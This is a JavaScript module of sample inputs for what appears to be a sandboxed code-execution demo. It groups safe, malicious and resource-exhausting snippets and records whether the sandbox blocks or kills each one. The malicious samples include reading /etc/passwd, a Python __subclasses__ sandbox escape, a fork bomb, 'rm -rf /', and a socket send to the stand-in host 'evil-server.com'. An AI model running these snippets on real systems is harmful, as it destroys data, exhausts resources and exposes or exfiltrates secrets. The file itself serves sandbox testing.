export const SAMPLE_INPUTS = [
  {
    id: 'safe-python-1',
    name: 'Hello World',
    language: 'python',
    category: 'safe',
    description: 'Simple print statement — completely safe',
    code: `print("Hello, World!")
print("Welcome to the Controlled Execution Sandbox")
print(f"2 + 2 = {2 + 2}")`,
  },
  {
    id: 'safe-python-2',
    name: 'Fibonacci Sequence',
    language: 'python',
    category: 'safe',
    description: 'Mathematical computation — safe execution',
    code: `def fibonacci(n):
    if n <= 1:
        return n
    a, b = 0, 1
    for _ in range(2, n + 1):
        a, b = b, a + b
    return b

for i in range(15):
    print(f"fibonacci({i}) = {fibonacci(i)}")`,
  },
  {
    id: 'safe-js-1',
    name: 'Array Operations',
    language: 'javascript',
    category: 'safe',
    description: 'Array manipulation — safe JavaScript execution',
    code: `const numbers = [5, 3, 8, 1, 9, 2, 7, 4, 6];
console.log("Original:", numbers);
console.log("Sorted:", [...numbers].sort((a, b) => a - b));
console.log("Sum:", numbers.reduce((a, b) => a + b, 0));
console.log("Max:", Math.max(...numbers));
console.log("Even:", numbers.filter(n => n % 2 === 0));
console.log("Doubled:", numbers.map(n => n * 2));`,
  },
  {
    id: 'safe-bash-1',
    name: 'Text Processing',
    language: 'bash',
    category: 'safe',
    description: 'Basic text operations — safe bash execution',
    code: `echo "=== Controlled Sandbox - Bash Demo ==="
echo "Current date: $(date)"
echo ""
echo "Sequence from 1 to 5:"
seq 1 5
echo ""
echo "Hello World" | tr '[:lower:]' '[:upper:]'
echo "Character count:" 
echo "Sandbox Security" | wc -c`,
  },
  {
    id: 'malicious-python-1',
    name: 'OS System Call',
    language: 'python',
    category: 'malicious',
    description: 'Attempts os.system() — BLOCKED by static analyzer',
    code: `import os
os.system("whoami")
os.system("cat /etc/passwd")`,
  },
  {
    id: 'malicious-python-2',
    name: 'Subprocess Execution',
    language: 'python',
    category: 'malicious',
    description: 'Attempts subprocess — BLOCKED by static analyzer',
    code: `import subprocess
result = subprocess.run(["ls", "-la"], capture_output=True, text=True)
print(result.stdout)`,
  },
  {
    id: 'malicious-python-3',
    name: 'Sandbox Escape Attempt',
    language: 'python',
    category: 'malicious',
    description: 'Introspection attack via __subclasses__ — BLOCKED',
    code: `# Attempting sandbox escape via Python introspection
for cls in ().__class__.__bases__[0].__subclasses__():
    if 'Popen' in cls.__name__:
        cls(['cat', '/etc/passwd']).communicate()`,
  },
  {
    id: 'malicious-js-1',
    name: 'Child Process Spawn',
    language: 'javascript',
    category: 'malicious',
    description: 'Attempts require(child_process) — BLOCKED',
    code: `const { exec } = require('child_process');
exec('whoami', (err, stdout) => {
  console.log(stdout);
});`,
  },
  {
    id: 'malicious-js-2',
    name: 'File System Access',
    language: 'javascript',
    category: 'malicious',
    description: 'Attempts require(fs) — BLOCKED',
    code: `const fs = require('fs');
const data = fs.readFileSync('/etc/passwd', 'utf8');
console.log(data);`,
  },
  {
    id: 'malicious-bash-1',
    name: 'Fork Bomb',
    language: 'bash',
    category: 'malicious',
    description: 'Classic fork bomb — BLOCKED by pattern detection',
    code: `:(){ :|:& };:`,
  },
  {
    id: 'malicious-bash-2',
    name: 'Destructive rm -rf',
    language: 'bash',
    category: 'malicious',
    description: 'Attempts recursive deletion — BLOCKED',
    code: `rm -rf / --no-preserve-root
echo "If you see this, the sandbox failed"`,
  },
  {
    id: 'resource-python-1',
    name: 'Infinite Loop',
    language: 'python',
    category: 'resource',
    description: 'while True loop — KILLED by timeout',
    code: `# This will be killed after the timeout limit
counter = 0
while True:
    counter += 1
    if counter % 1000000 == 0:
        print(f"Iteration: {counter}")`,
  },
  {
    id: 'resource-python-2',
    name: 'Memory Exhaustion',
    language: 'python',
    category: 'resource',
    description: 'Allocates massive string — KILLED by memory limit',
    code: `# Attempting to exhaust memory
data = " " * (10 ** 9)
print("If you see this, memory limit failed")`,
  },
  {
    id: 'resource-js-1',
    name: 'Infinite Loop (JS)',
    language: 'javascript',
    category: 'resource',
    description: 'Infinite for loop — KILLED by timeout',
    code: `let i = 0;
for (;;) {
  i++;
  if (i % 1000000 === 0) console.log("Iteration:", i);
}`,
  },
  {
    id: 'malicious-python-4',
    name: 'Network Access',
    language: 'python',
    category: 'malicious',
    description: 'Attempts socket connection — BLOCKED',
    code: `import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("evil-server.com", 4444))
s.send(b"data exfiltration")`,
  },
  {
    id: 'malicious-js-3',
    name: 'Eval Injection',
    language: 'javascript',
    category: 'malicious',
    description: 'Dynamic code execution via eval — BLOCKED',
    code: `eval("process.exit(1)");
new Function("return process.env")();`,
  },
];

export function getSamplesByCategory(category) {
  return SAMPLE_INPUTS.filter(s => s.category === category);
}

export function getSamplesByLanguage(language) {
  return SAMPLE_INPUTS.filter(s => s.language === language);
}
